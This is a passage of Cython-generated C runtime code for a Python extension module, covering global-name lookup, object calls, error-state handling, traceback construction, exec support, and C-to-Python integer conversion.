    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_NCP_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if CYTHON_COMPILING_IN_PYPY || PY_VERSION_HEX < 0x030200B1
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
